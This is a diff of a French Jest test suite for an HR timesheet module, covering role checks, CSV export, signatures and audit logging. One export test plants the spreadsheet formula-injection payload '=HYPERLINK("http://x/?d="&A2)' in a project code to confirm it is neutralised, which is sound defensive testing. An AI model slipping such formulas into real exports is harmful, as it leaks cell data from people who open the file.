@@ -18,7 +18,7 @@
 'use strict';
 
 const {
-  RUN, creerComptes, purger, creerSalarie, etatPool, signerChauffeur, iso,
+  RUN, creerComptes, purger, creerSalarie, etatPool, signerChauffeur, signer, iso,
 } = require('./_helpers');
 
 jest.mock('../../src/middleware/activity-logger', () => ({
@@ -73,6 +73,22 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
   beforeAll(async () => {
     await purger(pool, { matricules: MAT, usernamePrefix: PREFIXE, projetCodes: CODES });
     U = await creerComptes(pool, PREFIXE, ['ADMIN', 'RH', 'MANAGER']);
+    // Le rôle MANAGER a été RETIRÉ (2.52.0) : il n'atteint plus le module
+    // insertion. L'INTERVENANT de ces feuilles de temps — qui était un MANAGER —
+    // est désormais une seconde CIP (rôle RH), distincte de U.RH pour que la
+    // règle « on ne contresigne pas sa propre feuille » reste exerçable. Le
+    // jeton MANAGER reste créé : il sert à prouver le REFUS (rapport 31 § 5).
+    {
+      const r = await pool.query(
+        `INSERT INTO users (username, email, password_hash, role, first_name, last_name, is_active)
+         VALUES ($1, $2, 'x', 'RH', 'Jest', 'Manager', true)
+         ON CONFLICT (username) DO UPDATE SET role = 'RH', is_active = true RETURNING id`,
+        [`${PREFIXE}_interv`, `${PREFIXE}_interv@test.local`]);
+      U.INTERV = {
+        id: r.rows[0].id, role: 'RH',
+        token: signer({ id: r.rows[0].id, username: `${PREFIXE}_interv`, role: 'RH', last_name: 'Manager' }),
+      };
+    }
     chauffeur = signerChauffeur(88);
 
     sAsi = await creerSalarie(pool, MAT[0], {
@@ -84,7 +100,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     // Fiche salarié de l'INTERVENANT (MANAGER) : c'est par elle que se lisent
     // sa quotité contractuelle et ses congés (cohérence).
     ficheIntervenant = await creerSalarie(pool, MAT[2], {
-      first_name: 'Jest', last_name: 'Manager', weekly_hours: 35, user_id: U.MANAGER.id,
+      first_name: 'Jest', last_name: 'Manager', weekly_hours: 35, user_id: U.INTERV.id,
     });
 
     // ── Deux opérations cofinancées ─────────────────────────────────────────
@@ -107,7 +123,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     await pool.query(
       `INSERT INTO insertion_projet_postes (projet_id, user_id, quotite_pct, date_debut, date_fin)
        VALUES ($1, $2, 60, $3::date, $4::date)`,
-      [projetOcs, U.MANAGER.id, `${ANNEE}-01-01`, `${ANNEE}-12-31`]);
+      [projetOcs, U.INTERV.id, `${ANNEE}-01-01`, `${ANNEE}-12-31`]);
 
     // Amel est participante ASI sur tout le mois ; Karim ne l'est pas.
     await pool.query(
@@ -116,11 +132,11 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
       [projetAsi, sAsi, `${ANNEE}-02-01`]);
 
     // ── Les faits du mois ───────────────────────────────────────────────────
-    await poserEntretien(sAsi, U.MANAGER.id, `${ANNEE}-${M}-03`, 60);   // → ASI
-    await poserEntretien(sHors, U.MANAGER.id, `${ANNEE}-${M}-05`, 45);  // → OCS (poste)
-    await poserEntretien(sAsi, U.MANAGER.id, `${ANNEE}-${M}-10`, null); // sans durée → AUCUNE ligne
-    await poserEntretien(sAsi, U.MANAGER.id, `${ANNEE}-${M}-11`, 0);    // 0 min → AUCUNE ligne
-    await poserAction(sHors, U.MANAGER.id, `${ANNEE}-${M}-12`, 30);     // → OCS
+    await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-03`, 60);   // → ASI
+    await poserEntretien(sHors, U.INTERV.id, `${ANNEE}-${M}-05`, 45);  // → OCS (poste)
+    await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-10`, null); // sans durée → AUCUNE ligne
+    await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-11`, 0);    // 0 min → AUCUNE ligne
+    await poserAction(sHors, U.INTERV.id, `${ANNEE}-${M}-12`, 30);     // → OCS
     // Un entretien mené par quelqu'un d'AUTRE : il ne doit pas entrer dans la
     // feuille du MANAGER.
     await poserEntretien(sAsi, U.RH.id, `${ANNEE}-${M}-13`, 90);
@@ -146,7 +162,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
   // ═════════════════════════════════════════════════════════════════════════
   describe('composition de la feuille', () => {
     test('les lignes viennent des vrais faits — et un entretien SANS durée n\'en produit aucune', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(r.status).toBe(200);
       expect(r.body.statut).toBe('brouillon');
       expect(r.body.fige).toBe(false);
@@ -160,14 +176,14 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('l\'entretien d\'un AUTRE intervenant n\'entre pas dans cette feuille', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(r.body.lignes.some((l) => l.date === `${ANNEE}-${M}-13`)).toBe(false);
       const rh = await auth(request(app).get(url(U.RH.id)), 'ADMIN');
       expect(rh.body.lignes.some((l) => l.date === `${ANNEE}-${M}-13`)).toBe(true);
     });
 
     test('rattachement : ASI par la participation du salarié, OCS par le poste de l\'intervenant', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       const parDate = Object.fromEntries(r.body.lignes.map((l) => [l.date, l]));
       // Amel est participante ASI → l'entretien du 3 est rattaché à l'ASI.
       expect(parDate[`${ANNEE}-${M}-03`].projet_code).toBe(CODES[0]);
@@ -178,10 +194,10 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('une saisie hors projet est possible, et ressort « HORS_PROJET »', async () => {
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/saisies')), 'ADMIN')
+      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
         .send({ date: `${ANNEE}-${M}-17`, activite: 'atelier_collectif', duree_minutes: 120, libelle: 'Atelier CV' });
       expect(r.status).toBe(201);
-      const f = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const f = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       const l = f.body.lignes.find((x) => x.date === `${ANNEE}-${M}-17`);
       expect(l.projet_code).toBe('HORS_PROJET');
       expect(l.origine).toBe('saisie');
@@ -190,28 +206,28 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
 
     test('une saisie hors du mois est refusée en 400, sans écriture', async () => {
       const avant = await pool.query(
-        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.MANAGER.id]);
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/saisies')), 'ADMIN')
+        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
+      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
         .send({ date: `${ANNEE}-07-02`, activite: 'reunion_projet', duree_minutes: 60 });
       expect(r.status).toBe(400);
       expect(r.body.code).toBe('DATE_HORS_MOIS');
       const apres = await pool.query(
-        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.MANAGER.id]);
+        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
       expect(apres.rows[0].n).toBe(avant.rows[0].n);
     });
 
     test('une activité hors liste est refusée par le CHECK de la base ET par le validateur', async () => {
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/saisies')), 'ADMIN')
+      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
         .send({ date: `${ANNEE}-${M}-18`, activite: 'pause_cafe', duree_minutes: 15 });
       expect(r.status).toBe(400);
       await expect(pool.query(
         `INSERT INTO insertion_temps_saisies (user_id, date, activite, duree_minutes)
-         VALUES ($1, $2::date, 'pause_cafe', 15)`, [U.MANAGER.id, `${ANNEE}-${M}-18`]
+         VALUES ($1, $2::date, 'pause_cafe', 15)`, [U.INTERV.id, `${ANNEE}-${M}-18`]
       )).rejects.toMatchObject({ code: '23514' });
     });
 
     test('les totaux portent la quotité du poste et le taux forfaitaire de l\'opération', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       const t = r.body.totaux;
       expect(t.total_minutes).toBe(60 + 45 + 30 + 120);
       expect(t.par_projet[CODES[0]]).toBe(60);
@@ -227,7 +243,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('cohérence : une ligne un jour de congé est SIGNALÉE, sans rien bloquer', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(r.body.coherence.conforme).toBe(false);
       const a = r.body.coherence.anomalies.find((x) => x.type === 'jour_absence');
       expect(a).toBeTruthy();
@@ -243,7 +259,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('la date de clôture est calculée et le dépassement signalé, jamais bloquant', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(r.body.date_cloture).toBe(`${ANNEE}-07-10`);   // 10 du mois suivant
       expect(r.body.cloture_depassee).toBe(true);            // juin 2025 est passé
       expect(r.body.intervenant.nom).toMatch(/MANAGER/);
@@ -254,18 +270,23 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
   // 2. Habilitations et périmètre
   // ═════════════════════════════════════════════════════════════════════════
   describe('périmètre', () => {
-    test('un MANAGER lit SA feuille (200) et se voit refuser celle d\'un autre (403)', async () => {
-      const sienne = await auth(request(app).get(url(U.MANAGER.id)), 'MANAGER');
-      expect(sienne.status).toBe(200);
+    // Rôle MANAGER RETIRÉ (2.52.0) : il ne lit plus AUCUNE feuille, pas même
+    // celle d'un intervenant qu'il aurait été — refus à la porte du module.
+    test('un MANAGER (rôle retiré) est refusé sur toute feuille (403), la sienne comme celle d\'un autre', async () => {
+      const sienne = await auth(request(app).get(url(U.INTERV.id)), 'MANAGER');
+      expect(sienne.status).toBe(403);
       const autre = await auth(request(app).get(url(U.RH.id)), 'MANAGER');
       expect(autre.status).toBe(403);
-      expect(autre.body.code).toBe('FEUILLE_HORS_PERIMETRE');
+      expect(sienne.body).toEqual(autre.body);
+      // L'intervenant (CIP, rôle RH) lit sa propre feuille.
+      const cip = await auth(request(app).get(url(U.INTERV.id)), 'INTERV');
+      expect(cip.status).toBe(200);
     });
 
     test('le refus est posé AVANT toute requête en base', async () => {
       // Préchauffage du cache MFA : sans lui on mesurerait la lecture de
       // `settings` par `requireMfa`, pas la garde du lot.
-      await auth(request(app).get(url(U.MANAGER.id)), 'MANAGER');
+      await auth(request(app).get(url(U.INTERV.id)), 'MANAGER');
       const espion = jest.spyOn(pool, 'query');
       const r = await auth(request(app).get(url(U.RH.id)), 'MANAGER');
       expect(r.status).toBe(403);
@@ -280,13 +301,13 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('un jeton CHAUFFEUR est refusé', async () => {
-      const r = await request(app).get(url(U.MANAGER.id)).set('Authorization', `Bearer ${chauffeur}`);
+      const r = await request(app).get(url(U.INTERV.id)).set('Authorization', `Bearer ${chauffeur}`);
       expect(r.status).toBe(403);
     });
 
     test('un rôle COMMUNICATION est refusé', async () => {
       const com = await creerComptes(pool, `${PREFIXE}_x`, ['COMMUNICATION']);
-      const r = await request(app).get(url(U.MANAGER.id))
+      const r = await request(app).get(url(U.INTERV.id))
         .set('Authorization', `Bearer ${com.COMMUNICATION.token}`);
       expect(r.status).toBe(403);
       await pool.query('DELETE FROM users WHERE username LIKE $1', [`${PREFIXE}_x%`]);
@@ -296,12 +317,12 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
       const r = await auth(request(app).get(`/api/insertion/temps/intervenants?annee=${ANNEE}`), 'ADMIN');
       expect(r.status).toBe(200);
       const ids = r.body.map((i) => i.user_id);
-      expect(ids).toContain(U.MANAGER.id);
+      expect(ids).toContain(U.INTERV.id);
       expect(ids).toContain(U.RH.id);
       // L'ADMIN n'a mené aucun entretien et n'occupe aucun poste : il n'est pas
       // un « intervenant » — une liste de feuilles vides noierait celle qui compte.
       expect(ids).not.toContain(U.ADMIN.id);
-      const mgr = r.body.find((i) => i.user_id === U.MANAGER.id);
+      const mgr = r.body.find((i) => i.user_id === U.INTERV.id);
       expect(mgr.postes.some((p) => p.projet_code === CODES[1] && Number(p.quotite_pct) === 60)).toBe(true);
     });
   });
@@ -322,7 +343,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('le fichier porte son en-tête de traçabilité, les 6 colonnes et le pied complet', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id, '/export.csv')), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
       expect(r.status).toBe(200);
       expect(r.headers['content-type']).toMatch(/text\/csv/);
       expect(r.headers['content-disposition']).toMatch(/attachment; filename="temps_/);
@@ -345,7 +366,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('le NOM du bénéficiaire n\'y figure jamais — seul son identifiant interne', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id, '/export.csv')), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
       expect(r.text).not.toMatch(/Durand|Amel|Benali|Karim/);
       expect(r.text).toMatch(new RegExp(`;${sAsi};`));
       expect(r.text).toMatch(new RegExp(`;${sHors};`));
@@ -356,7 +377,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
       await pool.query(`UPDATE insertion_projets SET code = $2 WHERE id = $1`,
         [projetAsi, '=HYPERLINK("http://x/?d="&A2)']);
       try {
-        const r = await auth(request(app).get(url(U.MANAGER.id, '/export.csv')), 'ADMIN');
+        const r = await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
         expect(r.status).toBe(200);
         // Le tableur ne doit voir qu'un texte : apostrophe de tête, puis la
         // cellule guillemetée parce qu'elle contient elle-même un guillemet.
@@ -368,11 +389,11 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('l\'export est journalisé AVANT l\'envoi, avec le total mais sans nom', async () => {
-      await auth(request(app).get(url(U.MANAGER.id, '/export.csv')), 'ADMIN');
+      await auth(request(app).get(url(U.INTERV.id, '/export.csv')), 'ADMIN');
       const j = await pool.query(
         `SELECT details FROM rgpd_audit_log WHERE action = 'EXPORT_FEUILLE_TEMPS'
           ORDER BY id DESC LIMIT 1`);
-      expect(j.rows[0].details.intervenant_id).toBe(U.MANAGER.id);
+      expect(j.rows[0].details.intervenant_id).toBe(U.INTERV.id);
       expect(j.rows[0].details.annee).toBe(ANNEE);
       expect(j.rows[0].details.total_minutes).toBe(255);
       expect(JSON.stringify(j.rows[0].details)).not.toMatch(/Durand|Benali/);
@@ -384,18 +405,18 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
   // ═════════════════════════════════════════════════════════════════════════
   describe('signature, gel et réouverture', () => {
     test('la validation de l\'intervenant FIGE le snapshot en base', async () => {
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/valider')), 'MANAGER');
+      const r = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'INTERV');
       expect(r.status).toBe(200);
       expect(r.body.statut).toBe('validee_intervenant');
       const ligne = await pool.query(
         'SELECT statut, lignes, totaux, coherence, validation_intervenant FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
-        [U.MANAGER.id, ANNEE, MOIS]);
+        [U.INTERV.id, ANNEE, MOIS]);
       expect(ligne.rows[0].statut).toBe('validee_intervenant');
       expect(Array.isArray(ligne.rows[0].lignes)).toBe(true);
       expect(ligne.rows[0].lignes.length).toBe(4);
       expect(ligne.rows[0].totaux.total_minutes).toBe(255);
       expect(ligne.rows[0].coherence.conforme).toBe(false);   // l'anomalie est FIGÉE avec le reste
-      expect(ligne.rows[0].validation_intervenant.user_id).toBe(U.MANAGER.id);
+      expect(ligne.rows[0].validation_intervenant.user_id).toBe(U.INTERV.id);
       // Aucun nom de bénéficiaire dans le snapshot : les lignes ne portent que
       // l'identifiant interne depuis leur composition.
       expect(JSON.stringify(ligne.rows[0].lignes)).not.toMatch(/Durand|Benali/);
@@ -403,21 +424,21 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
 
     test('une saisie ajoutée APRÈS le gel est refusée en 409, sans INSERT', async () => {
       const avant = await pool.query(
-        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.MANAGER.id]);
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/saisies')), 'ADMIN')
+        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
+      const r = await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
         .send({ date: `${ANNEE}-${M}-25`, activite: 'reunion_projet', duree_minutes: 60 });
       expect(r.status).toBe(409);
       expect(r.body.code).toBe('FEUILLE_FIGEE');
       const apres = await pool.query(
-        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.MANAGER.id]);
+        'SELECT count(*)::int n FROM insertion_temps_saisies WHERE user_id = $1', [U.INTERV.id]);
       expect(apres.rows[0].n).toBe(avant.rows[0].n);
     });
 
     test('un fait nouveau ne bouge PLUS le total d\'une feuille signée', async () => {
       // Un entretien tardivement saisi pour le même mois : la feuille figée ne
       // doit pas le voir. C'est tout l'intérêt du snapshot.
-      const id = await poserEntretien(sAsi, U.MANAGER.id, `${ANNEE}-${M}-24`, 180);
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const id = await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-24`, 180);
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(r.body.fige).toBe(true);
       expect(r.body.totaux.total_minutes).toBe(255);
       expect(r.body.lignes.some((l) => l.date === `${ANNEE}-${M}-24`)).toBe(false);
@@ -426,7 +447,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
 
     test('la suppression d\'une saisie est refusée aussi tant que la feuille est figée', async () => {
       const s = await pool.query(
-        'SELECT id FROM insertion_temps_saisies WHERE user_id = $1 ORDER BY id LIMIT 1', [U.MANAGER.id]);
+        'SELECT id FROM insertion_temps_saisies WHERE user_id = $1 ORDER BY id LIMIT 1', [U.INTERV.id]);
       const r = await auth(request(app).delete(`/api/insertion/temps/saisies/${s.rows[0].id}`), 'ADMIN');
       expect(r.status).toBe(409);
       expect(r.body.code).toBe('FEUILLE_FIGEE');
@@ -436,10 +457,12 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('l\'intervenant ne contresigne pas sa propre feuille (409 AUTO_VALIDATION)', async () => {
-      // Le MANAGER n'est de toute façon pas habilité à la contre-signature…
-      const m = await auth(request(app).post(url(U.MANAGER.id, '/valider')), 'MANAGER');
-      expect(m.status).toBe(403);
-      expect(m.body.code).toBe('VALIDATION_RH_RESERVEE');
+      // L'intervenant (CIP, rôle RH) qui a signé le premier volet ne contresigne
+      // pas sa propre feuille… (le MANAGER, rôle retiré, est refusé à la porte.)
+      const m = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'INTERV');
+      expect(m.status).toBe(409);
+      expect(m.body.code).toBe('AUTO_VALIDATION');
+      expect((await auth(request(app).post(url(U.INTERV.id, '/valider')), 'MANAGER')).status).toBe(403);
       // …et la personne qui a signé le premier volet ne peut pas non plus
       // contresigner, même avec les droits RH.
       const rh = await auth(request(app).post(url(U.RH.id, '/valider')), 'RH'); // brouillon → intervenant
@@ -455,12 +478,12 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('la contre-signature par une AUTRE personne passe, et elle est journalisée', async () => {
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/valider')), 'ADMIN');
+      const r = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'ADMIN');
       expect(r.status).toBe(200);
       expect(r.body.statut).toBe('validee_rh');
       const relu = await pool.query(
         'SELECT statut, validation_rh FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
-        [U.MANAGER.id, ANNEE, MOIS]);
+        [U.INTERV.id, ANNEE, MOIS]);
       expect(relu.rows[0].validation_rh.user_id).toBe(U.ADMIN.id);
       const j = await pool.query(
         `SELECT details FROM rgpd_audit_log WHERE action = 'INSERTION_FEUILLE_TEMPS_VALIDATION'
@@ -469,7 +492,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('une troisième validation est refusée (transition forward-only)', async () => {
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/valider')), 'ADMIN');
+      const r = await auth(request(app).post(url(U.INTERV.id, '/valider')), 'ADMIN');
       expect(r.status).toBe(409);
       expect(r.body.code).toBe('TRANSITION_INVALIDE');
     });
@@ -485,19 +508,19 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('la réouverture est réservée à l\'ADMIN, motivée, et efface les DEUX signatures', async () => {
-      const sansMotif = await auth(request(app).post(url(U.MANAGER.id, '/rouvrir')), 'ADMIN').send({});
+      const sansMotif = await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'ADMIN').send({});
       expect(sansMotif.status).toBe(400);
 
-      const parRh = await auth(request(app).post(url(U.MANAGER.id, '/rouvrir')), 'RH')
+      const parRh = await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'RH')
         .send({ motif: 'Erreur de saisie sur une durée' });
       expect(parRh.status).toBe(403);
 
-      const r = await auth(request(app).post(url(U.MANAGER.id, '/rouvrir')), 'ADMIN')
+      const r = await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'ADMIN')
         .send({ motif: 'Erreur de saisie sur une durée d\'entretien' });
       expect(r.status).toBe(200);
       const relu = await pool.query(
         'SELECT statut, lignes, totaux, validation_intervenant, validation_rh FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
-        [U.MANAGER.id, ANNEE, MOIS]);
+        [U.INTERV.id, ANNEE, MOIS]);
       expect(relu.rows[0].statut).toBe('brouillon');
       expect(relu.rows[0].lignes).toBeNull();
       expect(relu.rows[0].validation_intervenant).toBeNull();
@@ -511,7 +534,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     });
 
     test('la feuille rouverte redevient vivante et reprend les faits du mois', async () => {
-      const r = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const r = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(r.body.statut).toBe('brouillon');
       expect(r.body.fige).toBe(false);
       expect(r.body.totaux.total_minutes).toBe(255);
@@ -541,7 +564,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     // CORRECTIF m-04 — pour un MANAGER, la saisie d'un autre et une saisie
     // inexistante sont INDISCERNABLES (404 dans les deux cas) : le couple
     // 404/403 énumérait les identifiants de saisie des collègues.
-    test('pour un MANAGER, saisie inconnue et saisie d\'un autre rendent le MÊME 404', async () => {
+    test('pour un MANAGER (rôle retiré), saisie inconnue et saisie d\'un autre rendent la MÊME réponse (403)', async () => {
       const q404 = await auth(request(app).delete('/api/insertion/temps/saisies/999999999'), 'ADMIN');
       expect(q404.status).toBe(404);
 
@@ -550,7 +573,9 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
       expect(s.status).toBe(201);
       const autre = await auth(request(app).delete(`/api/insertion/temps/saisies/${s.body.id}`), 'MANAGER');
       const inconnue = await auth(request(app).delete('/api/insertion/temps/saisies/999999998'), 'MANAGER');
-      expect(autre.status).toBe(404);
+      // Rôle MANAGER RETIRÉ (2.52.0) : les deux cas restent INDISCERNABLES — ils
+      // sont désormais refusés à la porte, avec la même réponse.
+      expect(autre.status).toBe(403);
       expect(autre.body).toEqual(inconnue.body);
       // Et la saisie est TOUJOURS là : refuser ne veut pas dire supprimer.
       const reste = await pool.query('SELECT count(*)::int n FROM insertion_temps_saisies WHERE id = $1', [s.body.id]);
@@ -572,17 +597,17 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     beforeAll(async () => {
       // On refige la feuille du MANAGER, puis on ajoute un fait POSTÉRIEUR au
       // gel : l'agrégat doit relire la feuille SIGNÉE, pas la recomposer.
-      await auth(request(app).post(url(U.MANAGER.id, '/valider')), 'MANAGER');
-      await poserEntretien(sAsi, U.MANAGER.id, `${ANNEE}-${M}-26`, 300);
+      await auth(request(app).post(url(U.INTERV.id, '/valider')), 'INTERV');
+      await poserEntretien(sAsi, U.INTERV.id, `${ANNEE}-${M}-26`, 300);
     });
 
     test('la synthèse relit les mois FIGÉS et concorde avec les feuilles signées', async () => {
       const r = await auth(request(app).get(`/api/insertion/temps/synthese?annee=${ANNEE}`), 'ADMIN');
       expect(r.status).toBe(200);
-      const mgr = r.body.par_intervenant.find((i) => i.user_id === U.MANAGER.id);
+      const mgr = r.body.par_intervenant.find((i) => i.user_id === U.INTERV.id);
       // 255 min figées : les 300 min ajoutées après la signature ne comptent pas.
       expect(mgr.minutes).toBe(255);
-      const feuille = await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      const feuille = await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       expect(feuille.body.totaux.total_minutes).toBe(mgr.minutes);
     });
 
@@ -655,7 +680,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
   // ═════════════════════════════════════════════════════════════════════════
   describe('gestion des connexions', () => {
     test('une rafale de 20 refus 4xx (dont des refus TRANSACTIONNELS) ne retient aucune connexion', async () => {
-      await auth(request(app).get(url(U.MANAGER.id)), 'ADMIN');
+      await auth(request(app).get(url(U.INTERV.id)), 'ADMIN');
       await new Promise((r) => setTimeout(r, 150));
       const avant = etatPool(pool);
       for (let i = 0; i < 20; i += 1) {
@@ -663,11 +688,11 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
         // celui-ci passe par `pool.connect()` et sort par un ROLLBACK), 409
         // (export vide), 400 (motif manquant, sur un chemin transactionnel).
         await auth(request(app).get(url(U.RH.id)), 'MANAGER');
-        await auth(request(app).post(url(U.MANAGER.id, '/saisies')), 'ADMIN')
+        await auth(request(app).post(url(U.INTERV.id, '/saisies')), 'ADMIN')
           .send({ date: `${ANNEE}-${M}-25`, activite: 'autre', duree_minutes: 30 });
-        await auth(request(app).post(url(U.MANAGER.id, '/valider')), 'ADMIN');
+        await auth(request(app).post(url(U.INTERV.id, '/valider')), 'ADMIN');
         await auth(request(app).get(`/api/insertion/temps/${U.ADMIN.id}/${ANNEE}/2/export.csv`), 'ADMIN');
-        await auth(request(app).post(url(U.MANAGER.id, '/rouvrir')), 'ADMIN').send({});
+        await auth(request(app).post(url(U.INTERV.id, '/rouvrir')), 'ADMIN').send({});
       }
       await new Promise((r) => setTimeout(r, 300));
       const apres = etatPool(pool);
@@ -683,7 +708,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
     test('l\'identifiant du salarié disparaît du snapshot, le volume d\'heures reste', async () => {
       const avant = await pool.query(
         'SELECT lignes, totaux FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
-        [U.MANAGER.id, ANNEE, MOIS]);
+        [U.INTERV.id, ANNEE, MOIS]);
       const lignesAvant = avant.rows[0].lignes || [];
       expect(lignesAvant.some((l) => Number(l.employee_id) === sAsi)).toBe(true);
       const totalAvant = avant.rows[0].totaux.total_minutes;
@@ -698,7 +723,7 @@ async function poserAction(employeeId, uid, jour, duree, libelle = 'Action de su
 
       const apres = await pool.query(
         'SELECT lignes, totaux FROM insertion_feuilles_temps WHERE user_id = $1 AND annee = $2 AND mois = $3',
-        [U.MANAGER.id, ANNEE, MOIS]);
+        [U.INTERV.id, ANNEE, MOIS]);
       const lignesApres = apres.rows[0].lignes;
       // Le lien nominatif disparaît…
       expect(lignesApres.some((l) => Number(l.employee_id) === sAsi)).toBe(false);
